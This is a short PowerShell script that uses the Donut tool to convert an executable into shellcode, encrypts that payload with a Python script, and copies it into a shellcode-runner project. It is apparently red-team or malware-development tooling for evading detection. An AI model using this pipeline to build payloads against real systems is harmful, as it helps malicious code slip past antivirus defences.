# 1. Take an .exe as input
# 2. create payload with Donut
# 3. encrypt this payload
# 4. place the encrypted payload in the target dictory (where the final app will use it)

param (
    [string]$AppArgs = "",
    [Parameter(Mandatory=$true)][string]$AppPath,
    [string]$DonutPath = "C:\Users\antoine\source\repos\donut-master-v0-9-1\donut.exe",
    [string]$CopyPayloadTo = "C:\Users\antoine\source\repos\RunShellcode\x64\Debug",
    [string]$EncPath = "C:\Users\antoine\source\repos\ShellcodeStubTemplate\encryptor.py"
 )
 
if (!$AppArgs){
    Invoke-Expression -Command "$DonutPath  -f $AppPath -a 2" 
    }
else {
     Invoke-Expression -Command "$DonutPath  -f $AppPath -a 2 -p $AppArgs" 
    }

Invoke-Expression -Command "python.exe $EncPath -f payload.bin -o enc_payload.bin "
Copy-Item -Force  enc_payload.bin $CopyPayloadTo